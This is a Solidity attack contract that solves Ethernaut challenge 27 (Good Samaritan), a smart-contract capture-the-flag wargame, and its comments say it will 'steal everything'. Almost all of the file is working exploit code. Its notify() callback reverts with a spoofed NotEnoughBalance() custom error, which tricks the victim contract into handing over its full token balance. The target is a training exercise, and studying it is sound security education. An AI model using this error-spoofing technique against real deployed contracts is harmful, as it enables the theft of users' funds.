// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

/// @notice This is the interface to call the main target's function.
interface IGoodSamaritan {
  function requestDonation() external returns (bool enoughBalance);
} 

/// @title Ethernaut challenge 27, hack contract, steal everything! 
/// @author WrappedUsername
contract GoodSamaritanAttack {  
  /// @notice This error is used to satisfy the if() statement in the main target
  error NotEnoughBalance();

  /** 
  * @notice This is the attack, player simply requests a donation, 
  * and steals everything with one click!
  */
  function attack(address _addr) external { 
     IGoodSamaritan(_addr).requestDonation();
  }

  /// @notice Notify is called when this contract receives the tokens.
  function notify(uint256 amount) external pure {
    /** 
    * @notice When the attack contract is notified about receiving 10 
    * tokens the attack contract reverts NotEnoughBalance() to the victim contract.
    */
    if (amount == 10) {
        revert NotEnoughBalance();
    } 
  }
}
